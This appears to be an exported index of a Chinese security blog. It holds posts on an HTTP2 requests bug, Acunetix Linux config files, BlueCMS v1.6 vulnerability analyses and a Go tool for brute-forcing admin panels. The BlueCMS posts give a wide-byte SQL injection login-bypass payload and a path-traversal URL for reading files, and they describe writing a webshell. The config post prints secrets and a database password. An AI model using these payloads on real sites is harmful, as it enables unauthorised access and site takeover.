<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ape-requests不支持http2</title>
    <url>/2019/28699.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在APE(Auto-Pentest)的时候,借鉴了<code>w13scan</code>的大部分代码.<br />
里面发包探测都用到了<code>requests</code>模块,时不时会出这种bug</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raise ValueError(&#x27;Invalid header name %r&#x27; % (header,))</span><br><span class="line">ValueError: Invalid header name b&#x27;:authority&#x27;</span><br></pre></td></tr></table></figure>
<hr />
<h1>Debug:</h1>
<p>请求了该url:<code>https://www.gstatic.com/proc/meminfo</code></p>
<p>输出该请求的headers后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;:authority&#x27;</span>: <span class="string">&#x27;www.gstatic.com&#x27;</span>, <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span>, <span class="string">&#x27;accept-encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>发现header中有个参数多了个冒号.</p>
<hr />
<h1>原因:</h1>
<p>goole了一下,参考了<a href="https://segmentfault.com/q/1010000007424047">http中的header为什么有这些部分？冒号的是什么</a></p>
<p>发现原来这些请求是用了<code>HTTP2</code>协议.而不是常见的<code>HTTP1.1</code></p>
<hr />
<h1>HTTP2的简单介绍:</h1>
<p>HTTP2 为什么要出现,又解决了HTTP1.1不能解决的什么事情呢？</p>
<p>简而言之就是</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>H2是一个二进制协议而,H1是超文本协议.传输的内容都不是一样的</strong></p>
</li>
<li class="lvl-2">
<p>H2遵循多路复用即,代替同一host下的内容,只建立一次连接. H1不是</p>
</li>
<li class="lvl-2">
<p>H2可以使用HPACK进行头部的压缩,H1则不论什么请求都会发送</p>
</li>
<li class="lvl-2">
<p>H2允许服务器,预先将网页所需要的资源PUSH到浏览器的内存当中.</p>
</li>
</ul>
<hr />
<h1>解决办法:</h1>
<h2 id="思路1">思路1:</h2>
<p>第一反应是看看<code>requests</code>支不支持HTTP2,发现是不支持的.<br />
<a href="https://stackoverflow.com/questions/44931070/does-python-requests-support-http2-and-asynchronous-calls">Does python-requests support HTTP2 and asynchronous calls?</a></p>
<p><img src="https://i.loli.net/2019/08/27/ClB43dsrNnPRQL7.jpg" alt="" /></p>
<hr />
<h2 id="思路2">思路2:</h2>
<p>HTTP2应该还不是很普及,那就只能简单粗暴的暂时把<code>headers</code>中含冒号给替换成空字符.</p>
<blockquote>
<p>或许应该在日志里把这类请求给记录下来,随便看看HTTP2用得多不多</p>
</blockquote>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://segmentfault.com/q/1010000007424047">http中的header为什么有这些部分？冒号的是什么</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/44931070/does-python-requests-support-http2-and-asynchronous-calls">Does python-requests support HTTP2 and asynchronous calls?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/etoah/p/5891285.html">HTTP2特性预览和抓包分析</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Awvs-linux版配置文件修改</title>
    <url>/2019/42460.html</url>
    <content><![CDATA[<h1>pre:</h1>
<p>linux版相较于wins版,默认配置有些许差异</p>
<table>
<thead>
<tr>
<th>version</th>
<th>api-port</th>
<th>db-port</th>
</tr>
</thead>
<tbody>
<tr>
<td>wins</td>
<td>3443</td>
<td>35432</td>
</tr>
<tr>
<td>linux</td>
<td>13443</td>
<td>45432</td>
</tr>
</tbody>
</table>
<p>现在要把linux的修改成wins的一样。。。</p>
<hr />
<h1>配置文件:</h1>
<h2 id="wvs-ini：">wvs.ini：</h2>
<p>配置文件</p>
<p>路径:<code>/home/acunetix/.acunetix_trial/wvs.ini</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">logging.file.file_name</span>=~/.acunetix_trial/logs/backend.log</span><br><span class="line"><span class="attr">base_storage</span>=~/.acunetix_trial/data</span><br><span class="line"><span class="attr">logging.file.level</span>=INFO</span><br><span class="line"><span class="attr">server.address</span>=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="number">3443</span> <span class="comment"># !!!edit</span></span><br><span class="line"><span class="attr">server.host</span>=debian</span><br><span class="line"><span class="attr">server.frontend.session_secret</span>=<span class="number">6</span>rRI3RtEOQbZJLXdQBIZdhKzL8q4D2YS</span><br><span class="line"><span class="attr">wvs.temp_dir</span>=~/.acunetix_trial/data/temp</span><br><span class="line"><span class="attr">target_secret_salt</span>=<span class="number">1</span>e79Bc99vW2r4H51chSULiA5WCXXPCGQ</span><br><span class="line"><span class="attr">uploads_salt</span>=mX75i7UNuXVKStEjM2ihLQy4SByclCkB</span><br><span class="line"><span class="attr">server.ssl.certificate</span>=~/.acunetix_trial/data/certs/server.cer</span><br><span class="line"><span class="attr">server.ssl.private_key</span>=~/.acunetix_trial/data/certs/server.key</span><br><span class="line"><span class="attr">databases.connections.master.connection.user</span>=acunetix</span><br><span class="line"><span class="attr">databases.connections.master.connection.host</span>=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">databases.connections.master.connection.port</span>=<span class="number">35432</span> <span class="comment"># !!!edit</span></span><br><span class="line"><span class="attr">databases.connections.master.connection.db</span>=wvs</span><br><span class="line"><span class="attr">databases.connections.master.connection.password</span>=j3ASXBKVp7f9lZDii9JwJKyKOUjI2ezy</span><br><span class="line"><span class="attr">server.static_document_root</span>=~/.acunetix_trial/v_190325161/ui</span><br><span class="line"><span class="attr">wvs.app_dir</span>=~/.acunetix_trial/v_190325161/scanner</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="start-sh"><a href="http://start.sh">start.sh</a></h2>
<p>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">version=v_190325161</span><br><span class="line">db_port=35432  <span class="comment"># !!!edit</span></span><br><span class="line">product_name=acunetix_trial</span><br><span class="line">engine_only=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$engine_only</span> != 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;attempting to stop previous database&quot;</span></span><br><span class="line">    ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -w stop</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;attempting to start the db&quot;</span></span><br><span class="line">    setsid ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -o <span class="string">&quot;--port=<span class="variable">$db_port</span>&quot;</span> -w start</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;attempting to start the backend&quot;</span></span><br><span class="line"><span class="comment">#~/.$product_name/$version/venv/bin/python3 ~/.$product_name/$version/backend/wvs.py --conf ~/.$product_name/wvs.ini</span></span><br><span class="line"><span class="built_in">cd</span> ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/backend/</span><br><span class="line">~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/backend/opsrv --conf ~/.<span class="variable">$product_name</span>/wvs.ini</span><br><span class="line"></span><br><span class="line">backend_exit_code=$?</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backend exited with&quot;</span> <span class="variable">$backend_exit_code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$engine_only</span> != 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;attempting to stop the database&quot;</span></span><br><span class="line">    ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -w stop</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bye.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> <span class="variable">$backend_exit_code</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr />
<h1>数据库文件:</h1>
<h2 id="pg-hba-conf">pg_hba.conf:</h2>
<p>路径: <code>/home/acunetix/.acunetix_trial/db/pg_hba.conf</code></p>
<p><img src="https://i.loli.net/2019/06/17/5d07572f4704659796.png" alt="" /></p>
<p>跟原来的wins有些许差异.</p>
<table>
<thead>
<tr>
<th>version</th>
<th>method</th>
</tr>
</thead>
<tbody>
<tr>
<td>wins</td>
<td>trust</td>
</tr>
<tr>
<td>linux</td>
<td>md5</td>
</tr>
</tbody>
</table>
<p>按上面的提示所说,<code>wins</code>的是用了<code>trust</code>是明文,linux是用加密的密码去连接.后面实际连接数据库要用.</p>
<hr />
<h2 id="postgresql-conf">postgresql.conf</h2>
<p>路径: <code>/home/acunetix/.acunetix_trial/db/postgresql.conf</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">listen_addresses</span> = <span class="string">&#x27;*&#x27;</span> <span class="comment"># !!!edit</span></span><br><span class="line"><span class="attr">port</span> = <span class="number">45432</span></span><br><span class="line"><span class="attr">max_connections</span> = <span class="number">100</span></span><br><span class="line"><span class="attr">ssl</span> = <span class="literal">off</span></span><br><span class="line"><span class="attr">shared_buffers</span> = <span class="number">128</span>MB</span><br><span class="line"><span class="attr">huge_pages</span> = try</span><br><span class="line"><span class="attr">event_source</span> = <span class="string">&#x27;Acunetix Trial Database&#x27;</span></span><br><span class="line"><span class="attr">client_min_messages</span> = notice</span><br><span class="line"><span class="attr">log_min_messages</span> = fatal</span><br><span class="line"><span class="attr">log_min_error_statement</span> = fatal</span><br></pre></td></tr></table></figure>
<hr />
<p>然后就可以连接了。。。</p>
<p><img src="https://i.loli.net/2019/06/18/5d085b3be432277542.png" alt="" /></p>
<p>密码在<code>wvs.ini</code>里。</p>
<hr />
<h1>refs:</h1>
<p><a href="https://www.acunetix.com/blog/category/docs/">acunetix docs</a></p>
<p>没事看看文档或者他家的博客,学习点扫描器思路再拿来自己写扫描器也是不错滴.</p>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>BlueCMS-v1.6-sp1-admin-login.phpSQL注入漏洞分析</title>
    <url>/2018/62100.html</url>
    <content><![CDATA[<h1>略读代码：</h1>
<p>开头包含了文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require_once(dirname(__FILE__) . &#x27;/include/common.inc.php&#x27;);</span><br></pre></td></tr></table></figure>
<p>该文件中,<strong>全局数据转义</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())//如果没有开启</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125; //加上斜杠转义</span><br></pre></td></tr></table></figure>
<p>输入了双引号，会被转义掉，那么此处就没办法简单地引入引号去控制Sql语句了。<br />
<img src="https://i.loli.net/2019/04/25/5cc1d6cc74921.jpg" alt="" /></p>
<hr />
<h1>转换思路：</h1>
<blockquote>
<p>这个时候发现自己没有思路了，只会单引号双引号。。。渣-c-</p>
</blockquote>
<p>参考一下：<a href="http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/">【Code Review】bluecms v1.6 Sql Injection 分析</a></p>
<p>可以发现对数据的注入，进行了<strong>加斜杠转义</strong>的操作。那么接下来找注入思路主要有以下3点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>找<strong>整数型注入</strong></p>
</li>
<li class="lvl-2">
<p>整套cms默认gb2312编码，容易造成<strong>宽字节注入</strong></p>
</li>
<li class="lvl-3">
<p><img src="https://i.loli.net/2019/04/25/5cc1d6cd6f056.jpg" alt="" /></p>
</li>
<li class="lvl-2">
<p><strong>http头</strong>并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入</p>
</li>
</ul>
<hr />
<h1>尝试宽字节注入：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>抓包修改<code>admin_name=%df%27+or+1%3D1%23</code></p>
</li>
<li class="lvl-2">
<p>明文就是<code>%df' or 1=1#</code></p>
</li>
<li class="lvl-2">
<p>单引号被转义后变成<code>%df\' or 1=1#</code></p>
</li>
<li class="lvl-2">
<p>宽字节注入是利用mysql的一个特性,因为gbk是多字节编码，他认为两个字节代表一个汉字，所以<code>%df</code>和后面的<code>\</code>也就是<code>%5c</code>变成了一个汉字“運”，而单引号逃逸了出来，就可以成功闭合sql语句了</p>
</li>
<li class="lvl-2">
<p>再加上后面的<code>or 1=1 #</code>就构造成了永真语句，可以成功免密登录管理员后台了</p>
</li>
</ul>
<hr />
<h1>理解宽字节：</h1>
<p>参考:<a href="http://www.freebuf.com/articles/web/31537.html">浅析白盒审计中的字符编码及SQL注入</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>本质是如何绕过addslashes函数：</p>
</li>
<li class="lvl-2">
<p>addslashes函数产生的效果就是，让<code>’</code>变成<code>\’</code>，让引号变得不再是“单引号”</p>
</li>
<li class="lvl-2">
<p>一般绕过方式就是，想办法处理<code>\’</code>前面的<code>\</code></p>
</li>
<li class="lvl-3">
<p>想办法给\前面再加一个\（或单数个即可），变成<code>\\’</code>，这样<code>\</code>被转义了，<code>’</code>逃出了限制</p>
</li>
<li class="lvl-3">
<p>想办法把<code>\</code>弄没有。</p>
</li>
<li class="lvl-2">
<p>mysql怎么判断一个字符是不是汉字?</p>
</li>
<li class="lvl-3">
<p>根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用<code>%df</code>，用<code>%a1</code>也可以</p>
</li>
<li class="lvl-2">
<p>gb2312和gbk的区别？</p>
</li>
<li class="lvl-3">
<p>gb2312编码的取值范围。它的高位范围是<code>0xA1~0xF7</code>，低位范围是<code>0xA1~0xFE</code>，而<code>\</code>是<code>0x5c</code>，是不在低位范围中的。</p>
</li>
<li class="lvl-3">
<p><code>0x5c</code>根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
</li>
</ul>
<p>修复方案1：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>先调用mysql_set_charset函数设置连接所使用的字符集为gbk</p>
</li>
<li class="lvl-2">
<p>再调用mysql_real_escape_string来过滤用户输入。</p>
</li>
<li class="lvl-2">
<p>这个方式是可行的，但有部分老的cms，在多处使用addslashes来过滤字符串，我们不可能去一个一个把addslashes都修改成mysql_real_escape_string。</p>
</li>
</ul>
<p>所以有修复方案2：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将character_set_client设置为binary（二进制）。</p>
</li>
<li class="lvl-2">
<p>只需在所有sql语句前指定一下连接的形式是二进制：<br />
<code>mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </code></p>
</li>
<li class="lvl-2">
<p>所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
</li>
</ul>
<hr />
<h1>编写pocsuite插件：</h1>
<h2 id="requests不进行urldecode：">requests不进行urldecode：</h2>
<p>参考：<a href="https://zhidao.baidu.com/question/1510942862655764300.html">如何在requests post时不做urlencode</a><br />
There are many times that you want to send data that is not form-encoded. If you pass in a  string  instead of a  dict , that data will be posted directly.<br />
所以，只要直接传一个string作为payload数据，requests就不会做任何转换，直接发出去。</p>
<p>并且加上<code>headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125; </code></p>
<h2 id="验证：">验证：</h2>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ceccdcc.jpg" alt="" /></p>
<p><a href="https://github.com/jerrychan807/Pocsuite/blob/dev/modules/bluecms_v1_6_sp1_admin_sqli.py">poc链接</a></p>
<hr />
<h1>总结：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>阅读源码的时候，先看看全局过滤</p>
</li>
<li class="lvl-2">
<p>gb2312、gbk编码的话，考虑宽字节注入</p>
</li>
<li class="lvl-2">
<p>宽字节注入的原理是 gbk是<strong>多字节编码</strong>，他认为两个字节代表一个汉字，所以可以用<code>%df</code>和后面的<code>\</code>也就是<code>%5c</code>变成了一个汉字“運”，而单引号逃逸了出来</p>
</li>
</ul>
<hr />
<h1>参考：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/">【Code Review】bluecms v1.6 Sql Injection 分析</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.freebuf.com/articles/web/31537.html">浅析白盒审计中的字符编码及SQL注入</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>BlueCMS-v1.6-sp1-admin-tpl_manage.php-本地文件包含漏洞分析</title>
    <url>/2018/59330.html</url>
    <content><![CDATA[<h1>熟悉功能：</h1>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6d684584.jpg" alt="" /></p>
<p>方便管理员对模板html文件进行修改</p>
<hr />
<h1>用户可控变量：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>$_REQUEST</code></p>
</li>
<li class="lvl-3">
<p><code>$_REQUEST['act']</code></p>
</li>
<li class="lvl-2">
<p><code>$_GET</code></p>
</li>
<li class="lvl-3">
<p><code>$_GET['tpl_name']</code></p>
</li>
<li class="lvl-2">
<p><code>$_POST</code></p>
</li>
<li class="lvl-3">
<p><code>$_POST['tpl_name']</code></p>
</li>
<li class="lvl-3">
<p><code>$_POST['tpl_content']</code></p>
</li>
</ul>
<p><code>$_REQUEST['act']</code>无法影响判断</p>
<h2 id="GET-‘tpl-name’">$_GET[‘tpl_name’]</h2>
<p>$_GET[‘tpl_name’]为你想要编辑的模板文件名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elseif($act == &#x27;edit&#x27;)&#123;</span><br><span class="line">$file = $_GET[&#x27;tpl_name&#x27;];</span><br><span class="line">if(!$handle = @fopen(BLUE_ROOT.&#x27;templates/default/&#x27;.$file, &#x27;rb&#x27;))&#123; # $file直接拼接</span><br><span class="line">	showmsg(&#x27;打开目标模板文件失败&#x27;); # 判断文件是否存在</span><br><span class="line">&#125;</span><br><span class="line">$tpl[&#x27;content&#x27;] = fread($handle, filesize(BLUE_ROOT.&#x27;templates/default/&#x27;.$file)); # 读取文件</span><br><span class="line">$tpl[&#x27;content&#x27;] = htmlentities($tpl[&#x27;content&#x27;], ENT_QUOTES, GB2312);</span><br><span class="line">fclose($handle);</span><br><span class="line">$tpl[&#x27;name&#x27;] = $file;</span><br><span class="line">template_assign(array(&#x27;current_act&#x27;, &#x27;tpl&#x27;), array(&#x27;编辑模板&#x27;, $tpl));</span><br><span class="line">$smarty-&gt;display(&#x27;tpl_info.htm&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有对<code>$_GET['tpl_name']</code>进行过滤，加上<code>../</code>可以读取web目录以外的内容。<br />
payload = <code>http://bluecmsv16:9990/admin/tpl_manage.php?act=edit&amp;tpl_name=../../../upgrade/upgrade.php</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6d79cd11.jpg" alt="" /></p>
<p>有什么比较有价值的网站文件吗?</p>
<p>可以php文件即读到网站源码</p>
<h2 id="POST变量">$_POST变量</h2>
<p><code>$_POST['tpl_name']</code>变量:你想要更改的网站模板文件<code>$_POST['tpl_content']</code>变量:你要更改的内容</p>
<p>两个变量均没有经过过滤，可以直接修改网站的源码<br />
<img src="https://i.loli.net/2019/04/25/5cc1d6d8cdcd1.jpg" alt="" /></p>
<hr />
<h1>编写pocsuite插件：</h1>
<p>发现需要root登录状态才行,可以通过之前的登录绕过获取到cookie</p>
<p>手工添加cookie尝试，该漏洞确实是要登录状态才能利用</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6da16fc6.jpg" alt="" /></p>
<p>要配合<code>BlueCMS v1.6 sp1 /admin/login.php SQL注入漏洞</code>一起使用</p>
<p>怎么攻击呢？</p>
<p>可以修改网站下的任何源代码，可以</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>写入一句话木马</p>
</li>
<li class="lvl-2">
<p>盗号js</p>
</li>
</ul>
<p>写入一句话木马</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6db66142.jpg" alt="" /><br />
<img src="https://i.loli.net/2019/04/25/5cc1d6dd2c21f.jpg" alt="" /></p>
<hr />
<h1>总结：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>有时候多个漏洞组合起来，可以达到一个很好的效果。</p>
</li>
<li class="lvl-2">
<p>要写验证和攻击的代码才能更了解漏洞的原理</p>
</li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Breacher-Go高并发管理员后台爆破工具</title>
    <url>/2019/7273.html</url>
    <content><![CDATA[<h1>preface :</h1>
<p><a href="https://github.com/s0md3v/Breacher">Breacher</a>是由python写的多线程管理员后台爆破工具</p>
<p>出于练手的目的,打算用golang重新造个轮子.</p>
<p>github:<a href="https://github.com/jerrychan807/Breacher-Go">Breacher-Go</a></p>
<h1>并发:</h1>
<p>python里面自然用得多的是多线程.<br />
而go里面自然要用到<code>goroutine</code></p>
<h1>go goroutine</h1>
<h2 id="语法">语法:</h2>
<p>在Go语言中，<strong>每一个并发的执行单元叫作一个<code>goroutine</code></strong></p>
<p>当一个程序启动时，其主函数即在一个单独的<code>goroutine</code>中运行，我们叫它<code>main goroutine</code>。</p>
<p>新的<code>goroutine</code>会用<code>go</code>语句来创建。</p>
<p>在语法上，go语句是一个普通的函数或方法调用前加上<strong>关键字<code>go</code></strong>。</p>
<p>go语句会使其语句中的函数在一个新创建的<code>goroutine</code>中运行。而go语句本身会迅速地完成。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">f()    <span class="comment">// call f(); wait for it to return</span></span><br><span class="line"><span class="keyword">go</span> f() <span class="comment">// create a new goroutine that calls f(); don&#x27;t wait</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在Go语言中，语言本身就已经实现和支持了并发,所以写起并发来相当方便.</p>
</blockquote>
<h2 id="goroutine的优势">goroutine的优势:</h2>
<p>gouroutine其实就是一种协程，类似其他语言中的coroutine， 是在编译器或虚拟机层面上的多任务。</p>
<p>它可以运行在一个或多个线程上，但不同于线程，它是<strong>非抢占式</strong>的，所以协程很轻量。</p>
<h1>简单的并发方案1</h1>
<p>简单的做法:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将需要处理的Url分成n等份</p>
</li>
<li class="lvl-2">
<p>开启n个goroutine去消费掉url</p>
</li>
</ul>
<ol>
<li class="lvl-3">
<p>将需要处理的Url分成n等份</p>
</li>
</ol>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">divided</span><span class="params">(links []<span class="type">string</span>, goroutineNum <span class="type">int</span>)</span></span> [][]<span class="type">string</span> &#123;</span><br><span class="line">	chunkSize := (<span class="built_in">len</span>(links) + goroutineNum - <span class="number">1</span>) / goroutineNum</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> dividedPath [][]<span class="type">string</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(links); i += chunkSize &#123;</span><br><span class="line">		end := i + chunkSize</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> end &gt; <span class="built_in">len</span>(links) &#123;</span><br><span class="line">			end = <span class="built_in">len</span>(links)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		dividedPath = <span class="built_in">append</span>(dividedPath, links[i:end])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dividedPath</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.开启n个goroutine去消费掉url</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">dividedLinks := divided(collected_path, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> dividedLinks &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%#v\n&quot;</span>, <span class="built_in">len</span>(link))</span><br><span class="line">	wg.Add(<span class="number">1</span>) <span class="comment">// Increment the WaitGroup counter.</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(link []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">		<span class="comment">// Launch a goroutine to fetch the link.</span></span><br><span class="line">		scan(start_url, link)</span><br><span class="line">		<span class="comment">// Fetch the link.</span></span><br><span class="line">		wg.Done()</span><br><span class="line">	&#125;(link)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait() <span class="comment">// Wait for all goroutines to finish.</span></span><br></pre></td></tr></table></figure>
<h1>速度比较:</h1>
<h2 id="自身速度比较">自身速度比较:</h2>
<p>go 不用并发消耗的时间:</p>
<p>不同网络环境下的消耗时间:</p>
<ol>
<li class="lvl-3">
<p><code>elapsed time:  1.951978378s</code> (5个goroutine)</p>
</li>
<li class="lvl-3">
<p><code>elapsed time:  11.353934431s</code></p>
</li>
<li class="lvl-3">
<p><code>elapsed time:  35.50535812s</code> (5个goroutine)</p>
</li>
<li class="lvl-3">
<p><code>elapsed time:  2m32.608078161s</code></p>
</li>
</ol>
<h2 id="与python的速度比较">与python的速度比较:</h2>
<p>python:<br />
2个线程:<code>74.5581650734s</code></p>
<p>go:<br />
2个goroutine<br />
<code>elapsed time:  1m10.233281137s</code></p>
<p>速度几乎是一样的,并非是想象中那样,go会比python快很多.</p>
<blockquote>
<p>question: 什么场景下goroutine会比python的thread有优势?</p>
</blockquote>
<hr />
<h1>减少误报:</h1>
<h2 id="最快的方式">最快的方式:</h2>
<p>最快的方式就是用<code>head</code>请求,然后通过<code>response code</code>判断,如果是<code>200</code>则认为存在.</p>
<p>但是这样在实际应用过程中,很有可能会产生大量的误报.</p>
<blockquote>
<p>使用御剑爆破网站路径的时候,同理也会产生大量的误报.</p>
</blockquote>
<h2 id="例子">例子:</h2>
<p>Response code是200</p>
<p>大量误报:<br />
<img src="https://i.loli.net/2019/04/25/5cc1d6df955e8.jpg" alt="" /></p>
<p>误报结果:<br />
<img src="https://i.loli.net/2019/04/25/5cc1d6e0776ac.jpg" alt="" /></p>
<h2 id="原因">原因:</h2>
<p>暂时能想到的原因有:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>网站本身会自定义错误或者404页面</p>
</li>
<li class="lvl-2">
<p>网站有防护设备,会自动重定向到别的页面</p>
</li>
</ul>
<h2 id="解决方案">解决方案:</h2>
<p>找到管理员的后台的目的,通常是为了暴力破解,尝试用弱密码进入到管理员的后台.</p>
<p>那么就是有个共同点就是有登录页面</p>
<p>密码框常用到是<code>input</code>标签的 type属性设为<code>password</code><br />
<img src="https://i.loli.net/2019/04/25/5cc1d6e141448.jpg" alt="" /></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6e1e2da6.jpg" alt="" /></p>
<p>解决方案：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>用<code>get</code>方法获取登录页面源码</p>
</li>
<li class="lvl-2">
<p>Response code 为200的同时,页面源码含有<code>type=&quot;password&quot;</code></p>
</li>
</ul>
<p>结果确实是大大减少了误报</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g0j41hdln4j30ou0pewte.jpg" alt="" /></p>
<blockquote>
<ol>
<li class="lvl-3">
<p>大字典的情况下,<code>get</code>方法的速度肯定会比<code>head</code>方法慢很多,哎,速度与准确性常常难以并存啊~</p>
</li>
<li class="lvl-3">
<p>减少误报的同时,则会产生漏报问题…</p>
</li>
</ol>
</blockquote>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://studygolang.com/articles/13875">图解 Go 并发编程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.kancloud.cn/hartnett/gopl-zh/126058">第八章 Goroutines和Channels</a></p>
</li>
<li class="lvl-2">
<p><a href="https://juejin.im/entry/5acac667518825619d4d0f44">Golang并发编程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/john_f_lau/article/details/50923380">Go计算运行的时间</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/35179656/slice-chunking-in-go">Slice chunking in Go</a></p>
</li>
</ul>
<h1>question:</h1>
<ol>
<li class="lvl-3">
<p>什么场景下goroutine会比python的thread有优势?</p>
</li>
<li class="lvl-3">
<p>减少误报的同时如何减少漏报?</p>
